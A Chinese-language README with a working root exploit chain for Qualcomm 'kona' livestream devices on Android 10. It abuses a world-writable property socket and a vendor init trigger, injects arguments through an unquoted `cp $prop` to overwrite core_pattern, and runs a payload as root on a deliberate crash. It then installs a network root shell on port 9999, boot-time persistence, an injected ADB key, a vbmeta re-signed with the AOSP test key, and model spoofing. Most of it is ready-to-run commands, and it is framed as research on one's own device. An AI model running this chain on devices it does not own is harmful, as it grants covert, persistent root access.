# 高通 kona 直播机 · Android 10 Root 方案

**适用的机器**：厂商固件里带了「属性触发 → init 以 root 执行厂商脚本」的调试后门，
同时 **开发者选项打不开（没有 ADB）、Type-C 只有充电、没有 fastboot/EDL**
—— 常规手段全都进不去的机器。

**产出**：root shell → 开机持久化 → Magisk（重签 AVB，不解锁 BL）。

> 本文每一步都标注了 **为什么必须有**，并用实测证据支撑。
> 用不上的步骤已经砍掉（见文末「剃刀」表）。

---

## 第 0 步：拿到一个能执行命令的 shell（**不需要 ADB**）

这台机器没有 ADB，所以第一步是**用 U 盘装一个终端类 App**：

1. 下载 Termux 的 APK（`arm64-v8a` 优先，装不上换 `armeabi-v7a`，再不行用 `universal`），拷进 U 盘
2. U 盘插到设备的 USB-A 口，用文件管理器安装，打开 Termux
3. Termux 里执行：

```sh
termux-setup-storage          # 弹权限窗，点允许
pkg install openssh
passwd                        # 给本机设个密码
sshd                          # 起 SSH，监听 8022
whoami                        # 记下这个用户名（形如 u0_aXX）
```

4. 电脑上 `ssh -p 8022 <用户名>@<设备IP>` —— 到这里你有了一个能执行命令的 shell。

**为什么这样就够**：下面利用的漏洞**只需要「能执行命令」**，不需要 root，也不需要 ADB。

**强烈建议顺手做**：装 `Termux:Boot`，在 `~/.termux/boot/` 放一个启动 `sshd` 的脚本。
这是你的**第二生命线** —— root 通道挂掉时还能进来排查。

---

## 第 1 步：第一个 root

### 1.1 入口条件（两条，先实测确认）

```sh
getenforce                            # 要 Permissive
ls -l /dev/socket/property_service    # 要 srw-rw-rw-（世界可写）
```

这两条合起来意味着：**任何进程都能写任意系统属性**。这是整个利用链的地基。

### 1.2 厂商的 root 执行链（rc 原文）

```sh
grep -rn "system_shell\|rats" /vendor/etc/init/
```

典型命中（`/vendor/etc/init/hw/init.target.rc`）：

```rc
on property:sys.rats.mode=prop
   exec - root root -- /system/bin/system_shell.sh prop
   setprop sys.rats.mode ""
```

⇒ **写一个属性，init 就以 root 身份执行厂商脚本**。

### 1.3 漏洞点：未加引号的变量

```sh
sed -n '/"prop")/,+3p' /system/bin/system_shell.sh
```

```sh
"prop")
    prop=`getprop system.file.update`          # 值来自属性 —— 我们完全可控
    cp $prop  /mnt/vendor/persist/build.prop   # 未加引号 → 词分割 → 参数注入
```

### 1.4 参数注入 → 任意 root 文件写入

词分割让我们能注入 `cp` 的参数，配合 `-s`（建符号链接）分两次打：

```sh
# 第一次：把目标变成【指向任意文件的符号链接】
setprop system.file.update "-s /proc/sys/kernel/core_pattern"
setprop sys.rats.mode prop
#   → 脚本执行 cp -s /proc/sys/kernel/core_pattern /mnt/vendor/persist/build.prop

# 第二次：cp 会【跟随符号链接】，把内容写进链接指向的真实文件
setprop system.file.update "/data/local/tmp/corepat"
setprop sys.rats.mode prop
#   → 内容被写进 /proc/sys/kernel/core_pattern
```

> `/proc/sys/kernel/core_pattern` 在 procfs（运行时文件系统）上，
> **不写任何分区** ⇒ 不破坏 dm-verity、不动启动链。

### 1.5 从「任意写」到「root 代码执行」

`core_pattern` 写成 `|<路径>` 之后，**任何进程崩溃，内核都会以 root 执行那个程序**：

```sh
# /data/local/tmp/corepat 的内容就一行：
|/data/local/tmp/payload
```

编译投放 payload（源码 `files/rootpay.c`），然后随便触发一个崩溃：

```sh
kill -SEGV $$
```

### 1.6 投放 root shell（不是可选项）

第一个 root 是**易失的**，立刻起一个常驻服务（源码 `files/rootsvc.c`）：

```sh
clang -O2 -o rootsvc files/rootsvc.c
./rootsvc &          # 监听 9999，拒绝本机来源连接
```

**为什么必须有**：

- 后续操作是**多步、需要来回判断**的（备份 / 校验 / 刷入），payload 只在崩溃那一刻活着，做不完
- Android 框架崩掉时（本项目实际遇到两次），adb 和图形界面全废，
  **只有这条原生 TCP 通道还能连上去做诊断和修复**

---

## 第 2 步：持久化 —— **必须放 persist，不能放 /data**

厂商自己的开机钩子是最省事的落点：

```sh
grep -rn "persist.*\.sh" /vendor/etc/init/ /vendor/bin/*.sh | head
```

典型形态：`/vendor/bin/init.<厂商>.sh` 每次开机以 root 执行
`/mnt/vendor/persist/<厂商目录>/init.custom.sh`。把 `files/persist_init.sh` 放过去即可。

> **⚠️ 实测教训**：早期把 payload 放在 `/data/data/...`。
> `/data` 是 **FBE 加密区，开机早期阶段读不到** ⇒ 重启后 root 起不来。
> 移到 `/mnt/vendor/persist`（非加密分区）后重启实测通过。

> **另一条实测教训**：persist 目录权限要给 `755`，否则 `uid=2000` 的 adb shell 读不到文件。

---

## 第 3 步：开 ADB（**厂商自带开关，一行属性**）

先把厂商的 rc 翻一遍，通常就有现成开关：

```sh
grep -rn "adb" /vendor/etc/init/hw/*.rc | head
```

```rc
on property:sys.connect.adb.wifi=1
   setprop service.adb.tcp.port 6565
```

**实测：`uid=2000` 就能写这个属性**，端口会切到 6565：

```sh
setprop service.adb.tcp.port 5555     # 想用自己的端口就改回来
setprop ctl.restart adbd
adb connect <设备IP>:5555
```

**厂商没有这个开关时**，自己写授权（需要 root）：

```sh
cat <你的公钥> >> /data/misc/adb/adb_keys
setprop service.adb.tcp.port 5555
setprop ctl.restart adbd
```

---

## 第 4 步：装 Magisk

### 4.1 前置判断：厂商 vbmeta 是不是 AOSP 公开测试密钥

```sh
python3 tools/parse_vbmeta.py vbmeta.img | grep -i algorithm    # 期望 SHA256_RSA4096
# 再把 vbmeta 里的公钥与 AOSP 的 testkey_rsa4096_pub.pem 逐字节比对
```

**命中才继续** —— 命中意味着私钥是公开的，你能自己签 vbmeta，从而合法地把改过的 boot 刷进去。
细节和两个会让你「看起来对、其实全错」的偏移陷阱见 **`avb/README.md`**。

### 4.2 步骤

```sh
# 备份（务必先做）
dd if=/dev/block/by-name/boot_a   of=/sdcard/boot_a.img
dd if=/dev/block/by-name/vbmeta_a of=/sdcard/vbmeta_a.img

# 用 magiskboot 给 boot 打补丁
magiskboot unpack boot_a.img
#   → 往 ramdisk.cpio 里加 magiskinit / magisk32.xz / magisk64.xz，打 patch，再 repack
magiskboot repack boot_a.img new-boot.img

# 重签 vbmeta（脚本内含三重自检）
python3 avb/resign_vbmeta.py vbmeta_a.img new-boot.img new-vbmeta.img

# 刷入（确认 B 槽可启动作为兜底）
dd if=new-boot.img   of=/dev/block/by-name/boot_a
dd if=new-vbmeta.img of=/dev/block/by-name/vbmeta_a
sync && reboot
```

### 4.3 验证

```sh
su -c id                                      # 期望 uid=0 且 context=u:r:magisk:s0
getprop ro.boot.verifiedbootstate             # 期望 green（引导程序认可你重签的 vbmeta）
```

---

## 第 5 步（可选）：机型伪装

**不要自研工具 —— Magisk 自带的 `resetprop` 就够**（实测能改只读 `ro.*`）：

```sh
magisk resetprop ro.product.model <目标机型>
```

**只改 `model` 这一个字段**，品牌 / 厂商 / fingerprint 全部保持原厂。
原因：厂商 App 读的是 `brand` / `manufacturer`，全局改会让它们上报错误品牌，可能影响服务端下发的配置。

---

## 剃刀：每个组件为什么必须（或为什么被砍）

| 组件 | 判定 | 依据 |
|---|---|---|
| U 盘装 Termux + SSH | ✅ 必须 | 没有 ADB / root / USB 数据时**唯一的入口** |
| `property_service` 可写 + Permissive | ✅ 必须 | 整个利用链的地基 |
| 厂商 `sys.<x>.mode` 属性触发 | ✅ 必须 | 唯一能拿到 root 执行的点 |
| 未加引号的 `cp $prop` | ✅ 必须 | 从「跑脚本」升级到「任意 root 写」 |
| `core_pattern` | ✅ 必须 | 从「任意写」升级到「**代码执行**」，且不碰任何分区 |
| `rootsvc` | ✅ 必须 | 多步操作需要持续 root；框架崩溃时唯一通道 |
| 放 persist 而非 /data | ✅ 必须 | `/data` 是 FBE 加密区，开机早期读不到（实测踩过） |
| 厂商 ADB 开关 / 自写 adb_keys | ✅ 必须 | 后续操作全靠 adb |
| AVB 重签 | ✅ 必须 | 装 Magisk 的前提 |
| **自研 `rsprop`** | ⚠️ **只在开机钩子里保留** | 手工改属性请用 Magisk 内置的 `magisk resetprop`（实测等效，见第 5 步）；开机钩子必须**不依赖 Magisk 是否就绪**，所以那里用它 |
| **`/system/build.prop` bind mount** | ❌ **已砍** | 实测撤掉后目标功能不受影响，只改属性已足够 |
| **设备树解析工具** | ❌ **已砍** | 与 root 无关 |

---

## 关键文件

| 文件 | 作用 |
|---|---|
| `files/rootpay.c` | `core_pattern` payload（拿第一个 root） |
| `files/sysctlwrite.c` | 写 `/proc/sys/kernel/core_pattern`（第 1.4 步用） |
| `files/rootsvc.c` | 独立于 Android 框架的 root shell（拒绝本机来源连接） |
| `files/persist_init.sh` | 开机自启钩子（应用机型冒充 + 恢复 adb + 看门狗） |
| `files/rsprop.c` | 运行时改写只读 `ro.*` 属性（**仅供开机钩子**；手工操作用 `magisk resetprop`） |
| `avb/resign_vbmeta.py` | vbmeta 重签（三重自检） |
| `avb/README.md` | AVB header 结构与偏移陷阱 |
| `tools/parse_vbmeta.py` | 判断厂商 AVB 密钥是否为 AOSP testkey |

---

## 危险清单

| 禁止 | 原因 |
|---|---|
| ❌ 写 `xbl` / `xbl_config` / `abl` 等引导链分区 | 由 PBL 校验，写坏 = **永久砖**；本机无 EDL / fastboot，救不回 |
| ❌ 没有 B 槽兜底就刷 boot | 出问题只能拆机 |
| ❌ 手改 vbmeta 偏移而不自检 | 见 `avb/README.md` 的两个陷阱 |
| ❌ root shell 无鉴权暴露在 `0.0.0.0` | 设备上任何 App 连 `127.0.0.1` 即可提权 |
| ❌ 把 payload 放在 `/data` | FBE 加密区，开机早期读不到 |

---

## License

仅供**你自己的设备**的兼容性研究与恢复用途。请遵守当地法律及设备厂商条款。
